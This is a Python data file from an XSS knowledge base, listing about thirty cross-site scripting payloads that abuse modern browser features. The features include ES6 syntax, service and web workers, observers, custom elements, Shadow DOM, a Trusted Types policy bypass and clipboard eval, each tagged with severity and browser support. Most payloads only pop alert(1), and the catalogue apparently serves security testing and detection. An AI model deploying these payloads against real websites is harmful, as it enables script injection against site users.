#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Modern Browser Payloads - Part 1
ES6 features, WebAssembly, Service Workers, Web Workers, Observers, Custom Elements, Shadow DOM, Trusted Types, and Clipboard API.
"""

from ..models import PayloadEntry


MODERN_BROWSER_PAYLOADS_PART1 = {
    # ES6 Template Literals
    "es6_template_1": PayloadEntry(
        payload="<script>alert`1`</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 template literal XSS",
        tags=["es6", "template-literal", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_template_2": PayloadEntry(
        payload="<script>`${alert(1)}`</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 template literal with interpolation",
        tags=["es6", "template-literal", "interpolation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_arrow_1": PayloadEntry(
        payload="<script>(()=>alert(1))()</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 arrow function IIFE",
        tags=["es6", "arrow-function", "iife"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_arrow_2": PayloadEntry(
        payload="<script>[1].map(x=>alert(x))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 arrow function with array method",
        tags=["es6", "arrow-function", "array"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_spread": PayloadEntry(
        payload="<script>alert(...[1])</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 spread operator",
        tags=["es6", "spread", "operator"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_destructuring": PayloadEntry(
        payload="<script>const{alert:a}=window;a(1)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 destructuring assignment",
        tags=["es6", "destructuring", "obfuscation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_class": PayloadEntry(
        payload="<script>class X{constructor(){alert(1)}};new X</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 class constructor XSS",
        tags=["es6", "class", "constructor"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_static_block": PayloadEntry(
        payload="<script>class X{static{alert(1)}}</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 static initialization block",
        tags=["es6", "class", "static-block"],
        browser_support=["chrome", "firefox", "edge"],
        reliability="certain",
    ),
    "es6_generator": PayloadEntry(
        payload="<script>function*g(){yield alert(1)};g().next()</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 generator function",
        tags=["es6", "generator", "yield"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_async": PayloadEntry(
        payload="<script>(async()=>alert(1))()</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 async arrow function",
        tags=["es6", "async", "arrow-function"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_proxy": PayloadEntry(
        payload="<script>new Proxy({},{get:()=>alert(1)}).x</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 Proxy trap XSS",
        tags=["es6", "proxy", "trap"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_reflect": PayloadEntry(
        payload="<script>Reflect.apply(alert,null,[1])</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 Reflect.apply",
        tags=["es6", "reflect", "apply"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_optional_chain": PayloadEntry(
        payload="<script>window?.alert?.(1)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 optional chaining",
        tags=["es6", "optional-chaining", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_nullish": PayloadEntry(
        payload="<script>(null??alert)(1)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="ES6 nullish coalescing",
        tags=["es6", "nullish-coalescing", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_dynamic_import": PayloadEntry(
        payload='<script>import("data:text/javascript,alert(1)")</script>',
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="ES6 dynamic import",
        tags=["es6", "dynamic-import", "module"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "es6_toplevel_await": PayloadEntry(
        payload='<script type="module">await import("data:text/javascript,alert(1)")</script>',
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="ES6 top-level await",
        tags=["es6", "module", "await"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # WebAssembly
    "wasm_basic": PayloadEntry(
        payload="<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(()=>alert(1))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="WebAssembly instantiation XSS",
        tags=["webassembly", "wasm", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "wasm_memory": PayloadEntry(
        payload="<script>new WebAssembly.Memory({initial:1}).buffer;alert(1)</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="WebAssembly memory manipulation",
        tags=["webassembly", "wasm", "memory"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Service Workers
    "sw_register": PayloadEntry(
        payload="<script>navigator.serviceWorker.register(\"data:text/javascript,self.addEventListener('fetch',e=>e.respondWith(new Response('<script>alert(1)<\\\\/script>',{headers:{'Content-Type':'text/html'}})))\")</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Service Worker registration XSS",
        tags=["service-worker", "pwa", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Web Workers
    "worker_blob": PayloadEntry(
        payload='<script>new Worker(URL.createObjectURL(new Blob(["postMessage(1)"],{type:"text/javascript"}))).onmessage=()=>alert(1)</script>',
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Web Worker blob XSS",
        tags=["web-worker", "blob", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "worker_data": PayloadEntry(
        payload='<script>new Worker("data:text/javascript,postMessage(1)").onmessage=()=>alert(1)</script>',
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Web Worker data URL XSS",
        tags=["web-worker", "data-url", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # MutationObserver
    "mutation_observer": PayloadEntry(
        payload='<script>new MutationObserver(()=>alert(1)).observe(document,{childList:true});document.body.innerHTML+=""</script>',
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="MutationObserver callback XSS",
        tags=["mutation-observer", "dom", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # IntersectionObserver
    "intersection_observer": PayloadEntry(
        payload="<script>new IntersectionObserver(()=>alert(1)).observe(document.body)</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="IntersectionObserver callback XSS",
        tags=["intersection-observer", "visibility", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # ResizeObserver
    "resize_observer": PayloadEntry(
        payload="<script>new ResizeObserver(()=>alert(1)).observe(document.body)</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="ResizeObserver callback XSS",
        tags=["resize-observer", "layout", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # BroadcastChannel
    "broadcast_channel": PayloadEntry(
        payload='<script>const c=new BroadcastChannel("x");c.onmessage=()=>alert(1);c.postMessage(1)</script>',
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="BroadcastChannel message XSS",
        tags=["broadcast-channel", "messaging", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Custom Elements
    "custom_element_callback": PayloadEntry(
        payload='<script>customElements.define("x-xss",class extends HTMLElement{connectedCallback(){alert(1)}})</script><x-xss></x-xss>',
        contexts=["html_content", "custom_elements"],
        severity="high",
        cvss_score=7.5,
        description="Custom Element connectedCallback XSS",
        tags=["custom-elements", "web-components", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "custom_element_attr": PayloadEntry(
        payload='<script>customElements.define("x-a",class extends HTMLElement{static get observedAttributes(){return["x"]}attributeChangedCallback(){alert(1)}})</script><x-a x=1></x-a>',
        contexts=["html_content", "custom_elements"],
        severity="high",
        cvss_score=7.5,
        description="Custom Element attributeChangedCallback XSS",
        tags=["custom-elements", "web-components", "attributes"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Shadow DOM
    "shadow_dom_open": PayloadEntry(
        payload='<script>document.body.attachShadow({mode:"open"}).innerHTML="<img src=x onerror=alert(1)>"</script>',
        contexts=["html_content", "shadow_dom"],
        severity="high",
        cvss_score=7.5,
        description="Shadow DOM open mode XSS",
        tags=["shadow-dom", "web-components", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "shadow_dom_declarative": PayloadEntry(
        payload='<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>',
        contexts=["html_content", "shadow_dom"],
        severity="high",
        cvss_score=7.5,
        description="Declarative Shadow DOM XSS",
        tags=["shadow-dom", "declarative", "modern"],
        browser_support=["chrome", "firefox", "edge"],
        reliability="certain",
    ),
    # Trusted Types bypass
    "trusted_types_bypass": PayloadEntry(
        payload='<script>trustedTypes.createPolicy("x",{createHTML:x=>x}).createHTML("<img src=x onerror=alert(1)>")</script>',
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Trusted Types policy bypass",
        tags=["trusted-types", "csp", "bypass"],
        browser_support=["chrome", "edge"],
        reliability="high",
    ),
    # Clipboard API
    "clipboard_read": PayloadEntry(
        payload="<script>navigator.clipboard.readText().then(t=>eval(t))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.0,
        description="Clipboard API read XSS",
        tags=["clipboard", "api", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
}


# =============================================================================
# WAF BYPASS 2024 PAYLOADS
# =============================================================================

WAF_BYPASS_2024_PAYLOADS = {
    # Cloudflare 2024
}
